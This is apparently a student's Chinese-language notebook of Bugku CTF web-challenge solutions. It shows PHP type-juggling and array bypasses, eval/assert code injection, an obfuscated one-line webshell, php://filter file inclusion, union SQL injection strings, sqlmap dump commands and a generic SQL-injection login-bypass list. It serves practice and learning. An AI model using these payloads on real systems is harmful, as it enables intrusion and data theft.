1.web2
	听说聪明的人都能找到答案
	http://123.206.87.240:8002/web2/
	CTRL + u 查看源代码

2.计算器
	http://123.206.87.240:8002/yanzhengma/
	改一下字符输入长度的限制

3.web基础$_GET
	http://123.206.87.240:8002/get/
	?var=val

4.web基础$_POST
	http://123.206.87.240:8002/get/index1.php
	直接用BurpSuite改包，注意先改为POST request

5.矛盾
	http://123.206.87.240:8002/get/index1.php
	$num = $_GET['num'];
	if(!is_numeric($num)) {
		echo $num;
		if($num == 1)  
		echo 'flag{**********}';
	}
	此处 == 为弱类型判断，num = 1e ，num == 1
	
6.web3
	flag就在这里快来找找吧
	http://123.206.87.240:8002/web3/
	直接查看源码，得&#75;&#69;&#89;&#123;&#74;&#50;&#115;&#97;&#52;&#50;&#97;
	&#104;&#74;&#75;&#45;&#72;&#83;&#49;&#49;&#73;&#73;&#73;&#125;
	扔到Burp 解码试试，解为html得flag

7.域名解析
	听说把 flag.bugku.com 解析到123.206.87.240 就能拿到flag
	两种办法：1.直接改本机 host 文件
			  2.访问时将请求头中的 host 改为flag.bugku.com
	然而我两种办法都失败了，显示域名没备案，哈哈哈
	
8.你必须让他停下
	http://123.206.87.240:8002/web12/
	页面不断的自动刷新，用Burp拦截，一张图一张图看，源代码中蕴含了flag
	
9.本地包含
	<?php 
		include "flag.php"; 
		$a = @$_REQUEST['hello'];  // @ 可屏蔽报错信息的显示
		eval( "var_dump($a);");   // eval() 漏洞
		show_source(__FILE__); 
	?>
	show_source() 对文件进行语法高亮
	hello=1);show_source('flag.php');var_dump(
	最终解释为：
	var_dump(1);show_source('flag.php');var_dump(show_source(__FILE__);
	
10.变量1
	flag In the variable ! 
	<?php  
		error_reporting(0);
		include "flag1.php";
		highlight_file(__file__);
		if(isset($_GET['args'])){
			$args = $_GET['args'];
			if(!preg_match("/^\w+$/",$args)){
				die("args error!");
			}
			eval("var_dump($$args);");
		}
	?>

	通过 include 或 require 语句，可以将 PHP 文件的内容插入另一个 PHP 文件

	// preg_match() 正则表达式匹配函数

	/^\w+$/

	两个//表示开始和结束
	^表示开始字符串
	$表示结束字符串
	\w表示包含【a-z，A-Z, _ , 0-9】
	+表示一个或者多个\w

	var_dump()显示一个或多个表达式的结构信息，包括表达式的类型与值。
	数组将递归展开值，通过缩进显示其结构

	eval()存在命令执行漏洞，我们是想查看flag1.php中的flag，
	首先想到的是本地包含漏洞，查看源码，或者上传一句话木马等思路
	但是条件判断加了正则表达式判断，过滤了括号和引号等字符。
	PHP 在 $GLOBALS[index] 数组中存储了所有全局变量，数组的键值为变量名

	$$args = $($args)

	$$ --> 可变变量，允许动态改变一个变量名称
	$name = "trans";
	$trans = "You can see me";
	echo $name.<br>;
	echo $$name;

	------------
	结果:
		trans
		You can see me
		
11.web5
	JSPFUCK??????答案格式CTF{**}
	http://123.206.87.240:8002/web5/
	查看源代码可得：([][(![]+[])[+[]] 这种加密过后的 js 代码，直接扔到 console 跑一下就出来
	
12.头等舱
	老办法，先看源代码，源代码还是啥也没有，看看请求头，找到了
	
13.网站被黑
	http://123.206.87.240:8002/webshell/
	这个题没技术含量但是实战中经常遇到
	扫一下后台，找到后门，Burp爆破就看到了
	
14.管理员系统
	特别突出的是 非本地IP访问，直接改个 X-Forwarded-For:127.0.0.1，然后再爆破
	X-Forwarded-For:简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项。它不是RFC中定义的标准请求头信息，在squid缓存代理服务器开发文档中可以找到该项的详细介绍。
	标准格式如下：X-Forwarded-For: client1, proxy1, proxy2
	
15.web4
	var p1 = ----;
	var p2 = ----;
	eval(unescape(p1) + unescape('%35%34%61%61%32' + p2));
									// 54aa2
	function checkSubmit() {
		var a = document.getElementById("password");
		if("undefined"!=typeof a) {
			if("67d709b2b54aa2aa648cf6e87a7114f1"==a.value)
				return !0;
			alert("Error");
			a.focus();
			return !1;
			}
		}
	document.getElementById("levelQuest").onsubmit=checkSubmit;
	明显发现有一段被 base64 加密过，解码可得
	
16.输入密码查看flag
	http://123.206.87.240:8002/baopo/
	目录提示使用爆破，5位数密码？？？
	纯数字！！！
	
17.点击一百万次
	var clicks=0
	$(function() {
	  $("#cookie")
		.mousedown(function() {
		  $(this).width('350px').height('350px');
		})
		.mouseup(function() {
		  $(this).width('375px').height('375px');
		  clicks++;
		  $("#clickcount").text(clicks);
		  if(clicks >= 1000000){
			var form = $('<form action="" method="post">' +
						'<input type="text" name="clicks" value="' + clicks + '" hidden/>' +
						'</form>');
						$('body').append(form);
						form.submit();
		  }
		});
	});

	观察得，若clicks >= 1000000 则执行下面的提交表单，
	索性直接 post 好了
	
18.过狗一句话
	<?php 
	$poc = "a#s#s#e#r#t"; 
	$poc_1 = explode("#",$poc);   
	// explode(separator,string,limit) 函数把字符串打散为数组
	$poc_2 = $poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; 
	$poc_2($_GET['s']) 
	?>
	bool assert ( mixed $assertion [, Throwable $exception ] )
	// 若assertion为字符串，则assertion将会被当做php代码执行，与eval()类似
	http://120.24.86.145:8010/?s=print_r(scandir('./'));
	print_r() 函数用于打印变量，以更容易理解的形式展示
	scandir(directory,sorting_order,context) 函数返回指定目录中的文件和目录的数组
	print_r(scandir('./'))  // 打印所有目录
	
	
# Welcome to bugku
<?php
	$user = $_GET["txt"];  
	$file = $_GET["file"];  
	$pass = $_GET["password"];  
	// file_get_contents() 把整个文件读入一个字符串中
	if(isset($user)&&(file_get_contents($user,'r')==="welcome to the bugkuctf")){  
		echo "hello admin!<br>";  
		include($file); //hint.php  
	}else{  
		echo "you are not admin ! ";  
	}  
?>
	这个题遇到很多骚办法，暂时还不会做
	博客 ：https://blog.csdn.net/csu_vc/article/details/78375203
		   https://blog.csdn.net/yh1013024906/article/details/81087939
	php 伪协议
	php://filter
	php://input
	// ROIS恰好也有这道题，暗示我多做题？？
	// 构造序列化，注意类名Read
	<?php
		class Read{
			public $file;
		}
		
		$a = new Read();
		$a->file = "f1a9.php";
		$a = serialize($a);
		print_r($a);
	?>
	<?php
	class Read{//f1a9.php
		public $file;
		public function __toString(){
			if(isset($this->file)){
				echo file_get_contents($this->file);    
			}
			return "__toString was called!";
		}
	}
	?>

	<?php
		$user = $_GET["user"];
		$file = $_GET["file"];
		$pass = $_GET["pass"];

		if(isset($user)&&(file_get_contents($user,'r')==="the user is admin")){
			echo "hello admin!<br>";
			if(preg_match("/f1a9/",$file)){
				exit();
			}else{
				include($file); //class.php
				$pass = unserialize($pass);
				echo $pass;
			}
		}else{
			echo "you are not admin ! ";
		}
	?>

# 各种绕过
	<?php 
		highlight_file('flag.php'); 
		$_GET['id'] = urldecode($_GET['id']);   // 将URL解码
		$flag = 'flag{xxxxxxxxxxxxxxxxxx}'; 
		if (isset($_GET['uname']) and isset($_POST['passwd'])) { 
			if ($_GET['uname'] == $_POST['passwd']) 
				print 'passwd can not be uname.'; 
			else if (sha1($_GET['uname']) === sha1($_POST['passwd'])&($_GET['id']=='margin')) 
				die('Flag: '.$flag); 
			else 
				print 'sorry!'; 
		} 
	?>
	先将 id URL编码 %6d%61%72%67%69%6e
	再用数组绕过sha1()

# linux
	linux基础问题
	得到一个压缩包，win下打不开，扔到kali解压后发现一个flag的文件，
	改权限777，cat强行查看，发现flag，不过本意好像不是这样
	strings 命令(此命令相当牛逼，以后再仔细学)
# linux2
	同上。。
	
	
# 宽带信息泄露
	题目给的是 conf.bin 文件，.bin 相当于一个万能后缀，无法直接确定
	打开看一下是二进制文件，题目强调的是宽带信息泄露,flag{宽带用户名}
	网上提示了一个工具 Routerpassview
	
	
# Javascript Tricks
	var net = require('net');
	flag='fake_flag';
	var server = net.createServer(
		function(socket) {
			socket.on('data', (data) => { 
				//m = data.toString().replace(/[\n\r]*$/, '');
				ok = true;
				arr = data.toString().split(' ');
				arr = arr.map(Number);
				if (arr.length != 5)   // arr长度为5
					ok = false;
				arr1 = arr.slice(0);  // 抽取从0开始的所有字符
				arr1.sort();
				for (var i=0; i<4; i++)  // 没有相同元素，正常ASCII码
					if (arr1[i+1] == arr1[i] || arr[i] < 0 || arr1[i+1] > 127)
						ok = false;
				arr2 = [];
				for (var i=0; i<4; i++)
					arr2.push(arr1[i] + arr1[i+1]);
				val = 0;
				for (var i=0; i<4; i++)
					val = val * 0x100 + arr2[i];  // 0x100 = 256
				if (val != 0x23332333)
					ok = false;
				if (ok)
					socket.write(flag+'\n');
				else
					socket.write('nope\n');
			});
			//socket.write('Echo server\r\n');
			//socket.pipe(socket);
		}
	);
	HOST = '0.0.0.0'
	PORT = 8082
	server.listen(PORT, HOST); 
	
	这里还要用到 netcat 简称 nc，又涨了波姿势
	
	
# extract变量覆盖
	<?php
		$flag='xxx';
		extract($_GET);
		if(isset($shiyan)){
			$content=trim(file_get_contents($flag));
			if($shiyan==$content){
				echo'flag{xxx}';
			}
			else{
				echo'Oh.no';
			}
		}
	?>
	extract(array[,extract_rules,prefix)]  
	// 数组键名作为变量名，数组键值作为变量值
	// 后几个参数是解决新创建的变量与原变量的冲突问题的
	// 就这个题来说，之前就有一个flag的变量了，此时GET一个flag进去就会把原flag的值覆盖掉
	// 如果$flag这个文件不存在，file_get_contents($flag)将为空
	// 此时只需传一个 shiyan&flag 就解决了
						 

# strcmp比较字符串
	<?php
		$flag = "flag{xxxxx}";
		if (isset($_GET['a'])) {
			if (strcmp($_GET['a'], $flag) == 0) 
				die('Flag: '.$flag);
			else
				print 'No';
		}
	?>
	// 比较两个字符串（区分大小写）正常规则：
	   如果 str1 小于 str2 返回 < 0；如果大于返回 > 0；如果相等，返回 0。
	// 如果传入的值不是字符串类型就将出故障，并 return 0
	// 比如 传一个数组 a[] ? 这题就做完了
	

# urldecode二次编码绕过
	<?php
		if(eregi("hackerDJ",$_GET[id])) {
			echo("not allowed!");
			exit();
		}
		$_GET[id] = urldecode($_GET[id]);
		if($_GET[id] == "hackerDJ")	{
			echo "Access granted!";
			echo "flag";
		}
	?>
	int ereg(string pattern, string string, array [regs]); 区分大小写
	int eregi(string $pattern, string $string [, array &$regs]) 不区分大小写的正则表达式匹配
	题面已经给了思路，将 hackerDJ 进行二次 url 编码即可绕过
	
	
# md5()函数
	<?php
		error_reporting(0);
		$flag = 'flag{test}';
		if (isset($_GET['username']) and isset($_GET['password'])) {
			if ($_GET['username'] == $_GET['password'])
				print 'Your password can not be your username.';
			else if (md5($_GET['username']) === md5($_GET['password']))
				die('Flag: '.$flag);
			else
				print 'Invalid password';
		}
	?>
	数组大法好，直接 username[]&password[]=1又轻松绕过 md5()
	原理：md5() 不能处理数组，md5(数组) 会返回 null
	

# 数组返回NULL绕过
	<?php
		$flag = "flag";
		if (isset ($_GET['password'])) {
			if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)
				echo 'You password must be alphanumeric';
			else if (strpos ($_GET['password'], '--') !== FALSE)
				die('Flag: ' . $flag);
			else
				echo 'Invalid password';
		}
	?>
	数组又能直接绕过？？ =>  password[]=1
	原理：
		ereg() 只能处理字符，传数组将返回 null，
		三个等号的时候不会进行类型转换，所以 null!==false
		strpos() 的参数同样不能是数组，返回依旧是 null，同上
		
	%00 截断：ereg()可以进行%00截断，这样就能绕开正则匹配  =>  password=1%00--
	

# 弱类型整数大小比较绕过
	<?php
		$temp = $_GET['password'];
		is_numeric($temp) ? die("no numeric") : NULL;
		if($temp>1336){
			echo $flag;
	?>
	数组又能直接绕过？？
	is_numeric()判断变量是否为数字或数字字符串
	password=1445%00 / password=1445%20
	

# sha1()函数比较绕过
	<?php
		$flag = "flag";
		if (isset($_GET['name']) and isset($_GET['password']))
		{
			var_dump($_GET['name']);
			echo "	";
			var_dump($_GET['password']);
			var_dump(sha1($_GET['name']));
			var_dump(sha1($_GET['password']));
			if ($_GET['name'] == $_GET['password'])
				echo 'Your password can not be your name!';
			else if (sha1($_GET['name']) === sha1($_GET['password']))
				die('Flag: '.$flag);
			else
				echo 'Invalid password.';
		}
		else
			echo 'Login first!';
	?>
	sha1() 计算字符串的散列值
	数组又能直接绕过？？
	sha1() 函数无法处理数组类型，将报错并返回false，false === false条件成立
	

# md5加密相等绕过
	<?php
		$md51 = md5('QNKCDZO');
		$a = @$_GET['a'];
		$md52 = @md5($a);
		if(isset($a)){
			if ($a != 'QNKCDZO' && $md51 == $md52) {
				echo "flag{*}";
			} else {
				echo "false!!!";
			}
		}
		else{
			echo "please input a";
		}
	?>
	PHP 在处理哈希字符串时，会利用 != / == 来对其进行比较，它把每个以“0e”的哈希值都解释为0。
	如果两个不同的密码经过哈希以后，哈希值都是以“0e"开头的话，PHP将认为这两个哈希值相同。

	常见的payload:
		QNKCDZO
		0e830400451993494058024219903391

		s155964671a
		0e342768416822451524974117254469

		s214587387a
		0e848240448830537924465865611904

		s878926199a
		0e545993274517709034328855841020

		s1091221200a
		0e940624217856561557816327384675

		s1885207154a
		0e509367213418206700842008763514

		s1836677006a
		0e481036490867661113260034900752

		s1184209335a
		0e072485820392773389523109082030

		s1665632922a
		0e731198061491163073197128363787

		s1502113478a
		0e861580163291561247404381396064

		s532378020a
		0e220463095855511507588041205815
		

# 十六进制与数字比较
	<?php
		error_reporting(0);
		function noother_says_correct($temp) {
			$flag = 'flag{test}';
			$one = ord('1');  //ord() 返回字符的 ASCII 码值
			$nine = ord('9');
			$number = '3735929054';
			for ($i = 0; $i < strlen($number); $i++) {
				$digit = ord($temp{$i});
				if (($digit >= $one) && ($digit <= $nine))
					return "flase";
			}
			if($number == $temp)
				return $flag;
		}
		$temp = $_GET['password'];
		echo noother_says_correct($temp);
	?>
	转十六进制 0xdeadc0de 绕过，别忘了加 0x
	
# strpos数组绕过	
	<?php
		$flag = "flag";
		if (isset ($_GET['ctf'])) {
			if (@ereg ("^[1-9]+$", $_GET['ctf']) === FALSE)
				echo '必须输入数字才行';
			else if (strpos ($_GET['ctf'], '#biubiubiu') !== FALSE)
				die('Flag: '.$flag);
			else
				echo '骚年，继续努力吧啊~';
		}
	?>
	数组又能直接绕过？？ ctf[]={#BIUBIUbiu}
	
	
# ereg正则%00截断
	<?php
		$flag = "xxx";
		if (isset ($_GET['password'])) {
			if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE) {
				echo 'You password must be alphanumeric';
		}
		else if (strlen($_GET['password']) < 8 && $_GET['password'] > 9999999) {
			if (strpos ($_GET['password'], '*-*') !== FALSE)
				die('Flag: ' . $flag);
			else
				echo('*-* have not been found');
		}
		else
			echo 'Invalid password';
		}
	?>
	1.数组绕过：password[]
	2.%00截断，再加上科学计数法  =>  password=1e9%00*-*
	
# 数字验证正则绕过
	<?php
		error_reporting(0);
		$flag = 'flag{test}';
		if ("POST" == $_SERVER['REQUEST_METHOD']) {
			$password = $_POST['password'];
			if (0 >= preg_match('/^[[:graph:]]{12,}$/', $password))	{
				echo 'flag';
				exit;
			}
			while (TRUE) {
				$reg = '/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/';
				if (6 > preg_match_all($reg, $password, $arr))
					break;
				$c = 0;
				$ps = array('punct', 'digit', 'upper', 'lower'); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母
				foreach ($ps as $pt) {
					if (preg_match("/[[:$pt:]]+/", $password))
						$c += 1;
				}
				if ($c < 3) break;
				//>=3，必须包含四种类型三种与三种以上
				if ("42" == $password) echo $flag;
				else echo 'Wrong password';
				exit;
			}
		}
	?>
	直接password=就出答案了？？？我？？？
	
	
# 字符？正则？
	<?php 
		highlight_file('2.php');
		$key='KEY{********************************}';
		$IM= preg_match("/key.*key.{4,7}key:\/.\/(.*key)[a-z][[:punct:]]/i", trim($_GET["id"]), $match);
		if( $IM ){ 
			die('key is: '.$key);
		}
	?> 
	单纯的考正则表达式，只要id成功匹配就会出flag，注意!!!最后一个是匹配任意标点符号!!!
	定界符：/和/（除了\和字母数字,其它的只要是成对出现都可以看做定界符，比如##、！！之类的）
	/i 表示忽略大小写
	id=key0key4434key:/a/aakeyb.
	忘记了最后那个标点符号，差点怀疑人生
	
	
# 程序员本地网站
	直接在请求头里添加 X-Forwarded-For:127.0.0.1
	
	
# 你从哪里来
	are you from google?
	将 refer 头修改为 https://www.google.com
	www.google.com 都不行
	http://www.google.com 都不行 :)
	
	
# login1(SKCTF)
	hint:SQL约束攻击
	先注册  user:admin                                    1
			 passwd:Abc123
	然后 用admin,Abc123也能登录上了
	[约束攻击详解](https://www.freebuf.com/articles/web/124537.html)
	
	
# md5 collision(NUPT_CTF)
	题目是MD5碰撞，直接传一个MD5以0e开头的过去
	
	
# 秋名山老司机
	亲请在2s内计算老司机的车速是多少
	每次显示一些随机的大数相加减
	我想到了py直接提交请求，然而自己独立写不出来
	import requests 
	import re 
	url = 'http://123.206.87.240:8002/qiumingshan/' 
	s = requests.Session() 
	source = s.get(url) 
	expression = re.search(r'(\d+[+\-*])+(\d+)', source.text).group() 
	result = eval(expression) 
	post = {'value': result} 
	print(s.post(url, data = post).text)
	必须利用会话对象 Session()，否则提交结果的时候，页面又重新生成一个新的表达式
	利用正则表达式截取响应内容中的算术表达式。首先引入 re 模块，其次用 search() 匹配算术表达式，匹配成功后用 group() 返回算术表达式的字符串。
	获得算术表达式的字符串后，直接利用 Python 的內建方法 eval() 来计算出结果，简单、暴力、快捷。
	
	
# web8
	txt？？？？
	<?php
		extract($_GET);
		if (!empty($ac)) {
			$f = trim(file_get_contents($fn));
			if ($ac === $f)
				echo "<p>This is flag:" ." $flag</p>";
			else
				echo "<p>sorry!</p>";
		}
	?>
	empty() 以下情况将返回TRUE
		"" (空字符串)
		0 (作为整数的0)
		0.0 (作为浮点数的0)
		"0" (作为字符串的0)
		NULL
		FALSE
		array() (一个空数组)
		$var; (一个声明了，但是没有值的变量)
	单个参数的extract()自然想到变量覆盖，然而$ac又不能为空
	扫了后台扫了个2.php，又提示txt，ac=txt& fn=2.php，结果没卵用，哈哈
	试了好几次后选择看writeup
	1.ac=flags& fn=flag.txt，这个想法真是脑洞打开
	2.利用伪协议读取post，妙极了
		ac=233 & fn=php://input
		再post一个233，齐活儿
	
	
# 前女友(SKCTF)
	<?php
		if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
			$v1 = $_GET['v1'];
			$v2 = $_GET['v2'];
			$v3 = $_GET['v3'];
			if($v1 != $v2 && md5($v1) == md5($v2)){
				if(!strcmp($v3, $flag)){
					echo $flag;
				}
			}
		}
	?>	
	md5碰撞，数组绕过strcmp()，做完了
	
	
# 速度要快
	我感觉你得快点!!!
	查看源码  =>  <!-- OK ,now you have to post the margin what you find -->
	找啊找啊，响应头里面发现了一个 flag 键名
	刷新一下还会变，flag: 6LeR55qE6L+Y5LiN6ZSZ77yM57uZ5L2gZmxhZ+WQpzogTmpNek56RXo=
	那就上py脚本搞吧，注意建立会话对象 session(),否则已提交，flag又变了
	
	import requests
	import base64

	url = 'http://123.206.87.240:8002/web6/'
	req = requests.session()
	flag = req.get(url).headers['flag']
	flag = base64.b64decode(flag)
	print(flag)
	flag = flag.decode()  # 防止split()报错
	flag = base64.b64decode(flag.split(':')[1])  # 解码两次才变成数值
	print(flag)
	data = {'margin':flag}
	print(req.post(url,data).content)  # 此处为了看得方便可继续解码，不过没必要
	
	
// 一定要养成手动保存的好习惯，东西丢了还是很伤心的，又要重写
	
	万能密码：
		
		-------asp万能密码----
	 
	      'or'='or'

	 
		--------aspx万能密码------
	 
	   1： "or "a"="a
	   2： ')or('a'='a
	   3：or 1=1--
	   4：'or 1=1--
	   5：a'or' 1=1--
	   6： "or 1=1--
	   7：'or'a'='a
	   8： "or"="a'='a
	   9：'or''='
	   10：'or'='or'
	   11: 1 or '1'='1'=1
	   12: 1 or '1'='1' or 1=1
	   13: 'OR 1=1%00
	   14: "or 1=1%00
	   15: 'xor
	   16: 新型万能登陆密码

	   用户名 ' UNION Select 1,1,1 FROM admin Where ''=' （替换表名admin）
	   密码 1
	   Username=-1%cf' union select 1,1,1 as password,1,1,1 %23
	   Password=1

	 
	   17..admin' or 'a'='a 密码随便


		--------PHP万能密码--------
	 
	   'or'='or'
	  
	   'or 1=1/*  字符型 GPC是否开都可以使用

	 
	   User: something
	   Pass: ' OR '1'='1

	 
		--------jsp 万能密码------

	   1'or'1'='1

	   admin' OR 1=1/*
	 
	   用户名：admin    系统存在这个用户的时候 才用得上
	   密码：1'or'1'='1


# cookies欺骗
	得到这么一个字符串：
	rfrgrggggggoaihegfdiofi48ty598whrefeoiahfeiafehbaienvdivrbgtubgtrsgbvaerubaufibry
	还有一个地址：index.php?line=& filename=a2V5cy50eHQ= (keys.txt)
	直接查看keys.txt，发现还是这么一段乱七八糟的字符串
	上面那个又向一个文件包含，filename传入的还是一个base64编码，看看 aW5kZXgucGhw (index.php)
	乍一看还是什么都没有，调整一下line的参数，有点东西了，一点一点扒下来
	<?php
		error_reporting(0);
		$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");
		$line=isset($_GET['line'])?intval($_GET['line']):0;
		if($file=='') header("location:index.php?line=&filename=a2V5cy50eHQ=");
		$file_list = array('0' =>'keys.txt','1' =>'index.php',);
		if(isset($_COOKIE['margin']) && $_COOKIE['margin']=='margin'){
			$file_list[2]='keys.php';
		}
		if(in_array($file, $file_list)){
			$fa = file($file);
			echo $fa[$line];
		}
	?>
	此时改一下 cookies，margin=margin，游戏结束

	
# flag在index里
	http://123.206.87.240:8005/post/index.php?file=show.php
	大佬说这是明显的文件包含漏洞，试试 php:\\filter 伪协议
	既然说flag在index里，看一下index源码，?file=php://filter/read=convert.base64-encode/resource=index.php
	PGh0bWw+DQogICAgPHRpdGxlPkJ1Z2t1LWN0ZjwvdGl0bGU+DQogICAgDQo8P3BocA0KCWVycm9yX3JlcG9ydGluZygwKTsNCglpZighJF9HRVRbZmlsZV0pe2VjaG8gJzxhIGhyZWY9Ii4vaW5kZXgucGhwP2ZpbGU9c2hvdy5waHAiPmNsaWNrIG1lPyBubzwvYT4nO30NCgkkZmlsZT0kX0dFVFsnZmlsZSddOw0KCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpew0KCQllY2hvICJPaCBubyEiOw0KCQlleGl0KCk7DQoJfQ0KCWluY2x1ZGUoJGZpbGUpOyANCi8vZmxhZzpmbGFne2VkdWxjbmlfZWxpZl9sYWNvbF9zaV9zaWh0fQ0KPz4NCjwvaHRtbD4NCg==
	
	解码一下
	<html>
    <title>Bugku-ctf</title>
  
	<?php
		error_reporting(0);
		if(!$_GET[file]){echo '<a href="./index.php?file=show.php">click me? no</a>';}
		$file=$_GET['file'];
		if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
			echo "Oh no!";
			exit();
		}
		include($file); 
	//flag:flag{edulcni_elif_lacol_si_siht}
	?>
	</html>
	
	
# 成绩单
	发现一个用 post 传 id 的输入框，注入题
	-1' union select 1,2,3,database()#
	-1' union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()#
	-1' union select 1,2,3,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x666c3467#  // 这里用16进制绕过一下
	-1' union select 1,2,3,skctf_flag from fl4g#
	
	sqlmap 也能跑出来，牛
		sqlmap -u URL --data="id=1"
		[11:01:58] [INFO] the back-end DBMS is MySQL
		back-end DBMS: MySQL >= 5.0.12
		发现后台数据库是 mysql
		
		列举所有数据库
		sqlmap -u URL --data="id=1" --dbs
		available databases [2]:
		[*] information_schema
		[*] skctf_flag
		
		爆出所有表
		sqlmap -u URL --data="id=1" -D skctf_flag --tables
		Database: skctf_flag
		[2 tables]
		+------+
		| fl4g |
		| sc   |
		+------+
		
		列出内容
		sqlmap -u http://123.206.87.240:8002/chengjidan/index.php --data="id=1" -T fl4g --dump 
		也可以选择全弄出来：sqlmap -u http://123.206.87.240:8002/chengjidan/index.php --data="id=1" -D skctf_flag --dump
		Database: skctf_flag
		Table: fl4g
		[1 entry]
		+---------------------------------+
		| skctf_flag                      |
		+---------------------------------+
		| BUGKU{Sql_INJECT0N_4813drd8hz4} |
		+---------------------------------+
		
# 备份是个好习惯
	d41d8cd98f00b204e9800998ecf8427e
	d41d8cd98f00b204e9800998ecf8427e
	提示提到了备份，应该是备份文件源码泄漏一类的，用脚本跑下后台有没有源码 {工具在 F/CTF_tools/源码泄露}
	得到 index.php.bak
	<?php
		include_once "flag.php";
		ini_set("display_errors", 0);
		$str = strstr($_SERVER['REQUEST_URI'], '?');
		$str = substr($str,1);
		$str = str_replace('key','',$str);
		parse_str($str);
		echo md5($key1);
		echo md5($key2);
		if(md5($key1) == md5($key2) && $key1 !== $key2){
			echo $flag."取得flag";
	}
	有个替换性的过滤，用 kekeyy 就能绕过
	分析源码，有个 parse_str()，此函数与 extract() 差不多，将关联数组中的元素与变量联系起来
	那么就可以这样传值进去，kekeyy1 & kekeyy2[]
	MD5函数无法处理数组，于是可以用 kekeyy1[]=33 & kekeyy2[]=44 进行绕过
	或者直接 MD5碰撞
?>

# never give up
	查看源码，发现一个小注释:1p.html
	一打开就跳转到其他页面，拿burp抓一下，发现如下信息
	
	var Words ="%3Cscript%3Ewindow.location.href%3D%27http%3A//www.bugku.com%27%3B%3C/script%3E%20%0A%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E" 
	function OutWord() {
		var NewWords;
		NewWords = unescape(Words);
		document.write(NewWords);
	} 
	OutWord();
	然后一路解码，得到代码
	<script>window.location.href='http://www.bugku.com';</script> 	
	<!--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ==-->
